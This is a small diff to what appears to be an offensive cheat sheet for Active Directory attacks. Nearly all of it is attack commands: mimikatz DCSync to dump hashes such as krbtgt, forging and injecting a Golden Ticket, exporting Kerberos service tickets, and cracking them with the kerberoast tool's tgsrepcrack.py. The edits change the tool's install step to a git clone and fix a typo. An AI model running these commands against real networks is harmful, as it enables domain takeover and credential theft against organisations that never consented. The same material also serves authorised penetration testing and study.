@@ -16,10 +16,10 @@ mimikatz # lsadump::dcsync /user:<username> (ex..krbtgt)
 Golden Ticket Attack:
 mimikatz # kerberos::golden /domain:<domain.name> /sid:<username SID> /rc4:<NTLM Hash> /user:<username> /ptt
 
-Download Service Ticket:
+Download Service Tickets:
 kerberos::list /export
 
 **You can use the 'Kerberoast' tool to try and bruteforce password (Hashcat or John work as well):
-sudo apt update && sudo apt install kerberoast
+git clone https://github.com/nidem/kerberoast.git
 
-python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <servcie@ticket.kirbi>
+./tgsrepcrack.py wordlist.txt <service@ticket.kirbi>
